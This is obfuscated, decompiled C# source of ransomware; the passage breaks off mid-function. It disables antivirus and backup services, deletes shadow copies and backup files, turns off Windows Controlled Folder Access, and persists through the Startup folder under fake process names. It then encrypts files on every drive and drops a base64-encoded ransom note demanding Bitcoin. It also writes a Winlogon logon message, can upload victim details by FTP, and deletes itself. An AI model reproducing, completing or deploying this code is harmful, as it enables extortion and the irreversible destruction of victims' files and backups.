using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace SNDBgbsWAO;

internal sealed class ahFIyKMEOzaLJ
{
	public sealed class vZihEfMvDeDT
	{
		private static StringCollection zCXNVaHqoERsT = new StringCollection();

		private static List<string> vuKXmIVDTLK = new List<string>();

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, "*.*");
			}
			catch (UnauthorizedAccessException ex)
			{
				zCXNVaHqoERsT.Add(ex.Message);
			}
			catch (DirectoryNotFoundException)
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer"))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(UqtSIrinfLrO) * 1024.0 * 1024.0 && JIEkyNHPnIA == "YES")
							{
								vuKXmIVDTLK.Add(text);
							}
							else if (File.Exists(text) && JIEkyNHPnIA == "NO")
							{
								vuKXmIVDTLK.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return vuKXmIVDTLK;
		}
	}

	private sealed class rlCSSwWkalJUFCD
	{
		public string[] yMFCuglUgJCVpAKQ;

		public string[] vbcNBZtJbT;

		public string bIslxlpGWGBq;

		public string yZxCFvnahuDn;
	}

	private sealed class yUiWqMhwsEYPsn
	{
		public rlCSSwWkalJUFCD CJURxbYdTVz;

		public string RIXsqLboma;

		public void _003CCrypt_003Eb__8()
		{
			RWxKZhMehYiZ(RIXsqLboma, CJURxbYdTVz.yMFCuglUgJCVpAKQ, CJURxbYdTVz.yZxCFvnahuDn, CJURxbYdTVz.vbcNBZtJbT, CJURxbYdTVz.bIslxlpGWGBq);
		}
	}

	public static string NSxVTTurZNc = "EVET";

	public static byte[] KCxeudouKYw = null;

	public static string JIEkyNHPnIA = "NO";

	public static string UqtSIrinfLrO = "100000000";

	public static List<string> JKOCmSVCfErA = new List<string>();

	public static List<string> xLCGTkRumjuyYa = new List<string>();

	public static string bbIhAVENmkRZg = "NO";

	public static string ubZAMtAytHM = "";

	public static string yLAcEsingaPGYGM = "NO";

	public static int rEqNfHxIEkSoP = 0;

	public static string yyyqaCwLcXoW = "NO";

	public static string IJJIJFVnjkosLHV = "NO";

	public static string AmuXDGvGpqW = "NO";

	public static string MSxrFDgfpezyG = "0";

	public static string UCYhudjcnqwtvY = "NO";

	public static string doJnWRBVCCzrT = "NO";

	public static string hHXCnpdpTW = "NO";

	public static string oQAsZDDDMZ = "NO";

	public static List<string> bDPamrCsxZgPCF = new List<string>
	{
		rnmdYHEmMKwyi("bHNhc3MuZXhl"),
		rnmdYHEmMKwyi("c3ZjaHN0LmV4ZQ=="),
		rnmdYHEmMKwyi("Y3Jjc3MuZXhl"),
		rnmdYHEmMKwyi("Y2hyb21lMzIuZXhl"),
		rnmdYHEmMKwyi("ZmlyZWZveC5leGU="),
		rnmdYHEmMKwyi("Y2FsYy5leGU="),
		rnmdYHEmMKwyi("bXlzcWxkLmV4ZQ=="),
		rnmdYHEmMKwyi("ZGxsaHN0LmV4ZQ=="),
		rnmdYHEmMKwyi("b3BlcmEzMi5leGU="),
		rnmdYHEmMKwyi("bWVtb3AuZXhl"),
		rnmdYHEmMKwyi("c3Bvb2xjdi5leGU="),
		rnmdYHEmMKwyi("Y3RmbW9tLmV4ZQ=="),
		rnmdYHEmMKwyi("U2t5cGVBcHAuZXhl")
	};

	public static List<string> TIWMmpXrbrbQ = new List<string>();

	public static string NakgmTtcQiPaGOCM = "YES";

	public static string ALmLdmfvgAkTTZYDl = "YES";

	public static string JbSGMiywHXwa = "YES";

	public static List<string> hhOuBtBefBMgsY = new List<string>();

	public static string zzqNwywUJjDx = "NO";

	private static string MeoqqGEEtfcTYt = "3747bdbf-0ef0-42d8-9234-70d68801f407";

	public static string SbQZSUlRdVFR = "NO";

	public static string kBuUwMTColD = "NO";

	public static List<string> qziZwSNQuxSWs = new List<string>
	{
		rnmdYHEmMKwyi("c3RvcCBhdnBzdXMgL3k="),
		rnmdYHEmMKwyi("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
		rnmdYHEmMKwyi("c3RvcCBtZmV3YyAveQ=="),
		rnmdYHEmMKwyi("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
		rnmdYHEmMKwyi("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k=")
	};

	public static List<string> TaPyYTssqLSF = new List<string>
	{
		rnmdYHEmMKwyi("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
		rnmdYHEmMKwyi("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
		rnmdYHEmMKwyi("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
		rnmdYHEmMKwyi("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
	};

	public static List<string> ksfBzFKCMKQ = new List<string>
	{
		rnmdYHEmMKwyi("L0lNIG1zcHViLmV4ZSAvRg=="),
		rnmdYHEmMKwyi("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		rnmdYHEmMKwyi("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G")
	};

	public static List<string> QQzxWJWQqlXu = new List<string>
	{
		rnmdYHEmMKwyi("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ="),
		rnmdYHEmMKwyi("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
		rnmdYHEmMKwyi("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
		rnmdYHEmMKwyi("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
		rnmdYHEmMKwyi("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
		rnmdYHEmMKwyi("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
		rnmdYHEmMKwyi("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
		rnmdYHEmMKwyi("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
		rnmdYHEmMKwyi("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
		rnmdYHEmMKwyi("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
		rnmdYHEmMKwyi("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
		rnmdYHEmMKwyi("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
		rnmdYHEmMKwyi("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
		rnmdYHEmMKwyi("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ=")
	};

	public static List<string> VDVoTJNelK = new List<string>
	{
		rnmdYHEmMKwyi("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
		rnmdYHEmMKwyi("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
		rnmdYHEmMKwyi("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
		rnmdYHEmMKwyi("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
		rnmdYHEmMKwyi("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
		rnmdYHEmMKwyi("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
	};

	public static string zmJifmVwogopT = "NO";

	public static string jEhutaHLPc = "NO";

	internal static DateTime qpEEHNJnHoXxQO = new DateTime(2000, 1, 1);

	internal static DateTime QpBQUJubjoYu = new DateTime(2100, 1, 1);

	public static string sVyPHvHEzbsPD = "YES";

	public static string mwdDsuOjNbyc = "10";

	public static string OwxmRjPKixOabC = "NO";

	public static string xWVegRTBRKbh = "NO";

	public static string wAMtdhBUlQT = "NO";

	public static string dXtdTHATibCsW = "YES";

	public static string tGcpsfWDfLbTl = "NO";

	public static string GPXLlkBXabl = "NO";

	public static List<string> BPlmKsLHiLCGcx = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string XzOLYKzyyKWdG = "NO";

	public static string OLVBwHKipWvp = "1";

	public static string ENMJAvAGRLJ = "NO";

	public static string zedTTftlMRFGyyT = "YES";

	public static string SEGzoppWbwkZO = "YES";

	public static string zzcRJxtxwLreObbLF = string.Empty;

	public static string rxRZoUdLuvHS = "NO";

	public static string KyPJIYHNLY = "YES";

	public static string aTSkprCPRTsY = "NO";

	public static string kbVudsjzLAjE = "";

	public static string hwxyUTEwhygE = "";

	private static void Main(string[] args)
	{
		try
		{
			wRgEeArTKCBXeNH.slwxQcYhyoVYy(MeoqqGEEtfcTYt);
		}
		catch (Exception)
		{
		}
		if (AmuXDGvGpqW == "YES")
		{
			Thread.Sleep(int.Parse(MSxrFDgfpezyG));
		}
		if (SEGzoppWbwkZO == "YES")
		{
			Thread thread = new Thread(TkJloPYvHU.xQEEzxUjRRuu);
			thread.IsBackground = true;
			thread.Start();
		}
		if (dXtdTHATibCsW == "YES" && tGcpsfWDfLbTl == "YES")
		{
			try
			{
				LeFlGuOtEiHCpVT("Set-MpPreference -EnableControlledFolderAccess Disabled");
			}
			catch
			{
			}
		}
		if (hHXCnpdpTW == "YES" && !QftAZFbhBsTF.fxJEMjXhoyJXp())
		{
			QftAZFbhBsTF.ZpSptMqvmFwq();
		}
		if (ALmLdmfvgAkTTZYDl == "YES" && QftAZFbhBsTF.fxJEMjXhoyJXp())
		{
			new dWZxVrKgFej().hIGVPwplfply(bool_0: false);
			new dWZxVrKgFej().wGWSbCLbIYpToe();
		}
		if (JbSGMiywHXwa == "YES")
		{
			Thread thread2 = new Thread(KAGRipkiGgpEhyuth.rMXsmgVprps);
			thread2.IsBackground = true;
			thread2.Priority = ThreadPriority.Highest;
			thread2.Start();
		}
		if (IJJIJFVnjkosLHV == "YES")
		{
			jGYmnrkhnpyDsP.YqopbNMKQeprk();
		}
		ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
		string fileName = mainModule.FileName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
		string text2 = text + Path.GetFileName(fileName);
		if (yLAcEsingaPGYGM == "YES" && fileName != text2)
		{
			Thread thread3 = new Thread(qgosCeKKwC);
			thread3.IsBackground = true;
			thread3.Priority = ThreadPriority.Highest;
			thread3.Start();
		}
		if (bbIhAVENmkRZg == "YES" && mainModule != null && fileName != text2)
		{
			try
			{
				rEqNfHxIEkSoP = fGiFArUunxIsbwm(0, bDPamrCsxZgPCF.Count);
				File.Copy(fileName, text + bDPamrCsxZgPCF[rEqNfHxIEkSoP], overwrite: true);
				Process.Start(text + bDPamrCsxZgPCF[rEqNfHxIEkSoP]);
				QSrbpXscVfy();
				Process.GetCurrentProcess().Kill();
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (zmJifmVwogopT == "YES" && DateTime.Now < qpEEHNJnHoXxQO)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (jEhutaHLPc == "YES" && DateTime.Now > QpBQUJubjoYu)
			{
				QSrbpXscVfy();
			}
		}
		catch
		{
		}
		foreach (string qziZwSNQuxSW in qziZwSNQuxSWs)
		{
			QfLjyyZxVIa("net.exe", qziZwSNQuxSW);
		}
		foreach (string item in TaPyYTssqLSF)
		{
			QfLjyyZxVIa("sc.exe", item);
		}
		foreach (string item2 in ksfBzFKCMKQ)
		{
			QfLjyyZxVIa("taskkill.exe", item2);
		}
		foreach (string item3 in QQzxWJWQqlXu)
		{
			QfLjyyZxVIa("vssadmin.exe", item3);
		}
		foreach (string item4 in VDVoTJNelK)
		{
			QfLjyyZxVIa("del.exe", item4);
		}
		bavPTEcucqrO.TEkoEinrndNoCC();
		if (NakgmTtcQiPaGOCM == "YES")
		{
			FSXKzYfwGkwUOE.dniYIIETgpKvR();
		}
		if (OwxmRjPKixOabC == "NO")
		{
			ubZAMtAytHM = UJZTHAekMyXsZm.NUFfsFEEdeYsVy(32);
		}
		else
		{
			ubZAMtAytHM = "BXD35XY7ESY04ZMO89FS2YWWVNEM93US";
		}
		string text3 = DPryNVblULYe.IBWXscfZbHbDr(ubZAMtAytHM);
		AqIpcRpNJSn(new string[1] { "[auto]" }, new string[97]
		{
			"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
			"zip", "html", "htm", "xlsx", "avi", "mp4", "ppt", "doc", "docx", "xlsx",
			"sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost",
			"pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java",
			"cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes",
			"vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6",
			"sqlite3", "sqlitedb", "accdb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf",
			"cert", "docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx",
			"mov", "xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql",
			"ora", "mdf", "ldf", "ndf", "dtsx", "rdl", "dim"
		}, new string[0], ubZAMtAytHM, ".crypted");
		ubZAMtAytHM = UJZTHAekMyXsZm.NUFfsFEEdeYsVy(32);
		using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt"))
		{
			streamWriter.WriteLine(rnmdYHEmMKwyi("QXRlbnRpb24hIGFsbCB5b3VyIGltcG9ydGFudCBmaWxlcyB3ZXJlIGVuY3J5cHRlZCENCnRvIGdldCB5b3VyIGZpbGVzIGJhY2sgc2VuZCAwLjUgQml0Y29pbnMgYW5kIGNvbnRhY3QgdXMgd2l0aCBwcm9vZiBvZiBwYXltZW50IGFuZCB5b3VyIFVuaXF1ZSBJZGVudGlmaWVyIEtleS4NCldlIHdpbGwgc2VuZCB5b3UgYSBkZWNyeXB0aW9uIHRvb2wgd2l0aCB5b3VyIHBlcnNvbmFsIGRlY3J5cHRpb24gcGFzc3dvcmQuDQoNCldoZXJlIGNhbiB5b3UgYnV5IEJpdGNvaW5zOg0KDQpodHRwczovL3d3dy5jb2luYmFzZS5jb20NCmh0dHBzOi8vbG9jYWxiaXRjb2lucy5jb20NCg0KQ29udGFjdDogZGFhYWF0YWFhYWFAcHJvdG9ubWFpbC5jb20uDQoNCkJpdGNvaW4gd2FsbGV0IHRvIG1ha2UgdGhlIHRyYW5zZmVyIHRvIGlzOjFLZXg1UW1CR3RKTERhZ24zbzJwMXlvcXlLbjJBNkVGRzk="));
			streamWriter.WriteLine(rnmdYHEmMKwyi("VW5pcXVlIElkZW50aWZpZXIgS2V5IChtdXN0IGJlIHNlbnQgdG8gdXMgdG9nZXRoZXIgd2l0aCBwcm9vZiBvZiBwYXltZW50KTog"));
			streamWriter.WriteLine("------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------");
			streamWriter.WriteLine(text3);
			streamWriter.WriteLine("------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------");
			if (SbQZSUlRdVFR == "NO")
			{
				streamWriter.WriteLine(rnmdYHEmMKwyi("TnVtYmVyIG9mIGZpbGVzIHRoYXQgeW91IGNvdWxkIGhhdmUgcG90ZW50aWFsbHkgbG9zdCBmb3JldmVyIGNhbiBiZSBhcyBoaWdoIGFzOiA=") + Convert.ToString(hhOuBtBefBMgsY.Count));
			}
		}
		foreach (string item5 in TIWMmpXrbrbQ)
		{
			try
			{
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt", item5 + "\\HELP_ME_RECOVER_MY_FILES.txt", overwrite: true);
			}
			catch (Exception)
			{
			}
		}
		if (zzqNwywUJjDx == "YES")
		{
			try
			{
				if (SbQZSUlRdVFR == "NO")
				{
					LpcRwcYYzTjJT.lAnyKoqlvAZUd("ftp://files.000webhost.com/public_html/", "FTP UserName", "FTP Password", rnmdYHEmMKwyi("Q2xpZW50IElQOiAg") + new WebClient().DownloadString(rnmdYHEmMKwyi("aHR0cDovL2ljYW5oYXppcC5jb20=")) + rnmdYHEmMKwyi("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + default(DateTime).Date.ToString() + "\r\n" + rnmdYHEmMKwyi("TnVtYmVyIG9mIGZpbGVzIGVuY3J5cHRlZDog") + Convert.ToString(hhOuBtBefBMgsY.Count) + "\r\n" + rnmdYHEmMKwyi("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + "\r\n" + Convert.ToString(hhOuBtBefBMgsY) + "\r\n" + rnmdYHEmMKwyi("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + text3);
				}
				else
				{
					LpcRwcYYzTjJT.lAnyKoqlvAZUd("ftp://files.000webhost.com/public_html/", "FTP UserName", "FTP Password", rnmdYHEmMKwyi("Q2xpZW50IElQOiAg") + new WebClient().DownloadString("aHR0cDovL2ljYW5oYXppcC5jb20=") + rnmdYHEmMKwyi("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + default(DateTime).Date.ToString() + "\r\n" + rnmdYHEmMKwyi("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + "\r\n" + Convert.ToString(hhOuBtBefBMgsY) + "\r\n" + rnmdYHEmMKwyi("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + text3);
				}
			}
			catch
			{
			}
		}
		if (oQAsZDDDMZ == "YES")
		{
			try
			{
				NDdveHoOCtozJ.EKZdJSLvdFSrQsmd(new Uri("http://www.my_wallpaper_location.com/wallpaper.bmp"));
			}
			catch
			{
			}
		}
		Process.Start(rnmdYHEmMKwyi("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt");
		if (KyPJIYHNLY == "YES")
		{
			PMjhxodnnjZ();
			if (aTSkprCPRTsY == "YES" && !string.IsNullOrEmpty(kbVudsjzLAjE) && !string.IsNullOrEmpty(hwxyUTEwhygE))
			{
				XPkKyZQGTzR(rnmdYHEmMKwyi(kbVudsjzLAjE), rnmdYHEmMKwyi(hwxyUTEwhygE));
			}
			else
			{
				XPkKyZQGTzR();
			}
		}
		if (!string.IsNullOrEmpty(zzcRJxtxwLreObbLF))
		{
			try
			{
				File.Delete(zzcRJxtxwLreObbLF);
			}
			catch
			{
			}
		}
		if (NSxVTTurZNc == "EVET")
		{
			QSrbpXscVfy();
		}
	}

	public static void qgosCeKKwC()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(rnmdYHEmMKwyi("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), rnmdYHEmMKwyi("QXRlbnRpb24h"), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int fGiFArUunxIsbwm(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> gupSYRqpArl(string string_0)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		if (!Directory.Exists(string_0))
		{
			throw new ArgumentException();
		}
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch (UnauthorizedAccessException)
			{
				continue;
			}
			catch (DirectoryNotFoundException)
			{
				continue;
			}
			catch (PathTooLongException)
			{
				continue;
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer"))
				{
					array = Directory.GetFiles(text);
					goto IL_00bc;
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (DirectoryNotFoundException)
			{
			}
			catch
			{
			}
			continue;
			IL_00bc:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(UqtSIrinfLrO) * 1024.0 * 1024.0 && JIEkyNHPnIA == "YES")
					{
						list.Add(fileInfo.FullName);
					}
					else if (File.Exists(fileInfo.FullName) && JIEkyNHPnIA == "NO")
					{
						list.Add(fileInfo.FullName);
					}
				}
				catch (FileNotFoundException)
				{
				}
				catch (PathTooLongException)
				{
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string QfLjyyZxVIa(string muRmPEMdKnmQhq = "", string SXRceYcWefjKCMdq = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = muRmPEMdKnmQhq,
				Arguments = SXRceYcWefjKCMdq,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void LeFlGuOtEiHCpVT(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string rnmdYHEmMKwyi(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void lUBgtaSmWId(string eWGGBTMuusezyzW = "U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb24=", string wyeBPLAursj = "QXRlbnRpb24uLi4=", string IgsyFPsxZnX = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(rnmdYHEmMKwyi(eWGGBTMuusezyzW), writable: true);
		if (registryKey != null)
		{
			registryKey.SetValue(rnmdYHEmMKwyi("TGVnYWxOb3RpY2VDYXB0aW9u"), rnmdYHEmMKwyi(wyeBPLAursj));
			registryKey.SetValue(rnmdYHEmMKwyi("TGVnYWxOb3RpY2VUZXh0"), rnmdYHEmMKwyi(IgsyFPsxZnX));
			registryKey.Close();
		}
	}

	public static void PMjhxodnnjZ()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (aTSkprCPRTsY == "YES" && !string.IsNullOrEmpty(kbVudsjzLAjE) && !string.IsNullOrEmpty(hwxyUTEwhygE))
				{
					lUBgtaSmWId("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb24=", rnmdYHEmMKwyi(kbVudsjzLAjE), rnmdYHEmMKwyi(hwxyUTEwhygE));
				}
				else
				{
					lUBgtaSmWId();
				}
			}
		}
		catch
		{
		}
	}

	public static void XPkKyZQGTzR(string ocqRTZOrIQ = "QXRlbnRpb24uLi4=", string lBPDmqiMBQzBu = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(rnmdYHEmMKwyi(ocqRTZOrIQ));
		val.set_BalloonTipText(rnmdYHEmMKwyi(lBPDmqiMBQzBu));
		val.ShowBalloonTip(30000);
	}

	public static void QSrbpXscVfy()
	{
		string text = rnmdYHEmMKwyi("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	private static void AqIpcRpNJSn(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		rlCSSwWkalJUFCD rlCSSwWkalJUFCD = new rlCSSwWkalJUFCD();
		rlCSSwWkalJUFCD.yMFCuglUgJCVpAKQ = string_1;
		rlCSSwWkalJUFCD.vbcNBZtJbT = string_2;
		rlCSSwWkalJUFCD.bIslxlpGWGBq = string_3;
		rlCSSwWkalJUFCD.yZxCFvnahuDn = string_4;
		KCxeudouKYw = Encoding.ASCII.GetBytes(rlCSSwWkalJUFCD.bIslxlpGWGBq);
		if (string_0[0] == "[auto]")
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			if (drives.Length > 0)
			{
				for (int i = 0; i < drives.Length; i++)
				{
					if (drives[i].IsReady)
					{
						JKOCmSVCfErA.Add(drives[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				JKOCmSVCfErA.Add(string_0[j]);
			}
		}
		using List<string>.Enumerator enumerator = JKOCmSVCfErA.GetEnumerator();
		while (enumerator.MoveNext())
		{
			yUiWqMhwsEYPsn CS_0024_003C_003E8__locals0 = new yUiWqMhwsEYPsn();
			CS_0024_003C_003E8__locals0.CJURxbYdTVz = rlCSSwWkalJUFCD;
			CS_0024_003C_003E8__locals0.RIXsqLboma = enumerator.Current;
			if (SbQZSUlRdVFR == "YES")
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
